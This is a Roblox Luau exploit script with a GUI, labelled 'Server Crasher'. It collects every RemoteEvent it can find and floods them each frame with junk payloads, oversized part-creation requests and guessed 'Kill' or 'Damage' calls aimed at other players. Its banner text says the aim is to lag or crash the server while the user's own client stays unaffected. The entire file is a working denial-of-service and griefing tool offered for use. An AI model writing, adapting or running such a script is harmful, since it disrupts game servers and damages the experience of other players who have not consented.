-- SERVER CRASHER - NO SELF CRASH
-- Fixed: Won't crash your client
-- Only targets server & other players

task.wait(3)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 10)

pcall(function()
    if playerGui:FindFirstChild("CrasherGUI") then
        playerGui.CrasherGUI:Destroy()
        task.wait(0.5)
    end
end)

-- ============================================
-- ANTI SELF-CRASH PROTECTION
-- ============================================
local selfProtection = true -- Always protect self

local function isSafe()
    return selfProtection
end

-- Protect client from lag
local lastSpam = 0
local SPAM_DELAY = 0.1 -- Delay to prevent self-lag

local function canSpam()
    local now = tick()
    if now - lastSpam < SPAM_DELAY then
        return false
    end
    lastSpam = now
    return true
end

-- ============================================
-- VARIABLES
-- ============================================
local crashRunning = false
local remotes = {}
local crashConnections = {}
local spamCount = 0

-- ============================================
-- NOTIFICATION
-- ============================================
local function notif(msg, durasi)
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Crasher";
            Text = msg;
            Duration = durasi or 3;
        })
    end)
    print("[Crasher]", msg)
end

-- ============================================
-- SCAN REMOTES
-- ============================================
local function scanRemotes()
    remotes = {}
    
    print("[SCAN] Scanning remotes...")
    
    -- Only scan safe locations
    for _, obj in pairs(game.ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            table.insert(remotes, obj)
        end
    end
    
    for _, obj in pairs(Workspace:GetDescendants()) do
        if obj:IsA("RemoteEvent") then
            table.insert(remotes, obj)
        end
    end
    
    print("[SCAN] Found " .. #remotes .. " remotes")
    
    return #remotes
end

-- ============================================
-- SAFE CRASH METHODS (No self-crash)
-- ============================================

-- Method 1: Controlled Remote Spam
local function controlledSpam()
    print("[CRASH] Controlled spam...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning or not isSafe() then return end
        if not canSpam() then return end
        
        -- Limit spam to prevent self-crash
        local spamPerFrame = math.min(5, #remotes)
        
        for i = 1, spamPerFrame do
            local remote = remotes[i]
            if remote then
                pcall(function()
                    -- Moderate data size (not too big)
                    remote:FireServer(string.rep("X", 500))
                    remote:FireServer({data = "CRASH"})
                    spamCount = spamCount + 1
                end)
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 2: Target Other Players (Not self!)
local function targetPlayers()
    print("[CRASH] Targeting other players...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning or not isSafe() then return end
        if not canSpam() then return end
        
        for _, plr in pairs(Players:GetPlayers()) do
            -- IMPORTANT: Skip self!
            if plr ~= player then
                for i = 1, math.min(3, #remotes) do
                    local remote = remotes[i]
                    if remote then
                        pcall(function()
                            remote:FireServer("Kill", plr)
                            remote:FireServer("Damage", plr, 999999)
                            remote:FireServer({Action = "Kill", Player = plr})
                            spamCount = spamCount + 1
                        end)
                    end
                end
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 3: Safe Instance Requests
local function safeInstanceFlood()
    print("[CRASH] Safe instance flood...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning or not isSafe() then return end
        if not canSpam() then return end
        
        -- Limit requests
        for i = 1, math.min(5, #remotes) do
            local remote = remotes[i]
            if remote then
                pcall(function()
                    remote:FireServer("CreatePart", {Size = Vector3.new(100, 100, 100)})
                    remote:FireServer({Action = "Create", Type = "Part"})
                    spamCount = spamCount + 1
                end)
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- Method 4: Network Pressure (Controlled)
local function networkPressure()
    print("[CRASH] Network pressure...")
    
    local connection = RunService.Heartbeat:Connect(function()
        if not crashRunning or not isSafe() then return end
        if not canSpam() then return end
        
        -- Send moderate packets
        for i = 1, math.min(10, #remotes) do
            local remote = remotes[i]
            if remote then
                pcall(function()
                    remote:FireServer(string.rep("CRASH", 100))
                    spamCount = spamCount + 1
                end)
            end
        end
    end)
    
    table.insert(crashConnections, connection)
end

-- ============================================
-- MAIN FUNCTIONS
-- ============================================

local function startCrash()
    if crashRunning then
        notif("⚠️ Already running!", 2)
        return
    end
    
    notif("🔥 Starting crash (SAFE)...", 3)
    
    -- Scan remotes
    local remoteCount = scanRemotes()
    
    if remoteCount == 0 then
        notif("❌ No remotes found!", 3)
        return
    end
    
    notif("💣 Found " .. remoteCount .. " remotes!", 3)
    
    crashRunning = true
    spamCount = 0
    
    -- Activate methods with delays
    task.spawn(controlledSpam)
    task.wait(0.3)
    task.spawn(targetPlayers)
    task.wait(0.3)
    task.spawn(safeInstanceFlood)
    task.wait(0.3)
    task.spawn(networkPressure)
    
    notif("💥 CRASH ACTIVE (SAFE MODE)!", 4)
    
    -- Monitor spam count
    task.spawn(function()
        while crashRunning do
            task.wait(5)
            if crashRunning then
                print("[CRASH] Spam count: " .. spamCount)
                notif("📊 Sent " .. spamCount .. " commands", 2)
            end
        end
    end)
    
    print("================================")
    print("SAFE CRASH ACTIVE:")
    print("- Controlled spam")
    print("- Target other players")
    print("- Safe instance flood")
    print("- Network pressure")
    print("- Self-protection: ON")
    print("================================")
end

local function stopCrash()
    if not crashRunning then
        notif("⚠️ Not running!", 2)
        return
    end
    
    crashRunning = false
    
    for _, connection in pairs(crashConnections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
    
    crashConnections = {}
    
    notif("⏸️ STOPPED (Total: " .. spamCount .. ")", 3)
    print("[CRASH] Stopped. Total spam: " .. spamCount)
end

-- ============================================
-- CREATE GUI
-- ============================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "CrasherGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 380, 0, 300)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -150)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local MainCorner = Instance.new("UICorner")
MainCorner.CornerRadius = UDim.new(0, 15)
MainCorner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 55)
Header.BackgroundColor3 = Color3.fromRGB(200, 0, 0)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 15)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -70, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "💥 SAFE CRASHER"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 18
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 50, 0, 50)
CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(150, 0, 0)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 24
CloseBtn.Parent = Header

local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 10)
CloseBtnCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    stopCrash()
    ScreenGui:Destroy()
    notif("👋 Closed", 2)
end)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -30, 1, -70)
Content.Position = UDim2.new(0, 15, 0, 60)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Status
local Status = Instance.new("TextLabel")
Status.Size = UDim2.new(1, 0, 0, 25)
Status.Position = UDim2.new(0, 0, 0, 0)
Status.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Status.TextColor3 = Color3.fromRGB(0, 255, 0)
Status.Font = Enum.Font.GothamBold
Status.TextSize = 13
Status.Text = "🛡️ Self-Protection: ACTIVE"
Status.Parent = Content

local StatusCorner = Instance.new("UICorner")
StatusCorner.CornerRadius = UDim.new(0, 8)
StatusCorner.Parent = Status

-- Crash Button
local CrashBtn = Instance.new("TextButton")
CrashBtn.Size = UDim2.new(1, 0, 0, 70)
CrashBtn.Position = UDim2.new(0, 0, 0, 35)
CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
CrashBtn.Text = "💣 CRASH SERVER\n(Safe - Won't Crash You)"
CrashBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashBtn.Font = Enum.Font.GothamBold
CrashBtn.TextSize = 18
CrashBtn.Parent = Content

local CrashBtnCorner = Instance.new("UICorner")
CrashBtnCorner.CornerRadius = UDim.new(0, 12)
CrashBtnCorner.Parent = CrashBtn

CrashBtn.MouseButton1Click:Connect(function()
    startCrash()
    CrashBtn.BackgroundColor3 = Color3.fromRGB(100, 0, 0)
    CrashBtn.Text = "🔥 CRASHING...\n(Server Target)"
    Status.TextColor3 = Color3.fromRGB(255, 255, 0)
    Status.Text = "⚠️ CRASH ACTIVE - You're safe!"
end)

-- Stop Button
local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(1, 0, 0, 55)
StopBtn.Position = UDim2.new(0, 0, 0, 115)
StopBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
StopBtn.Text = "⏸️ STOP CRASH"
StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 16
StopBtn.Parent = Content

local StopBtnCorner = Instance.new("UICorner")
StopBtnCorner.CornerRadius = UDim.new(0, 12)
StopBtnCorner.Parent = StopBtn

StopBtn.MouseButton1Click:Connect(function()
    stopCrash()
    CrashBtn.BackgroundColor3 = Color3.fromRGB(220, 20, 20)
    CrashBtn.Text = "💣 CRASH SERVER\n(Safe - Won't Crash You)"
    Status.TextColor3 = Color3.fromRGB(0, 255, 0)
    Status.Text = "🛡️ Self-Protection: ACTIVE"
end)

-- Info
local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(1, 0, 0, 60)
Info.Position = UDim2.new(0, 0, 1, -60)
Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Info.TextColor3 = Color3.fromRGB(200, 200, 200)
Info.Font = Enum.Font.Gotham
Info.TextSize = 11
Info.TextWrapped = true
Info.Text = [[✅ SAFE VERSION

Won't crash YOUR client!
Controlled spam rate
Target: Server & other players

Server may lag/crash
You stay safe!]]
Info.Parent = Content

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 10)
InfoCorner.Parent = Info

local InfoPadding = Instance.new("UIPadding")
InfoPadding.PaddingTop = UDim.new(0, 8)
InfoPadding.PaddingLeft = UDim.new(0, 8)
InfoPadding.PaddingRight = UDim.new(0, 8)
InfoPadding.Parent = Info

notif("🛡️ Safe Crasher Loaded!", 3)
print("================================")
print("SAFE SERVER CRASHER")
print("Self-protection: ENABLED")
print("PlaceId:", game.PlaceId)
print("================================")
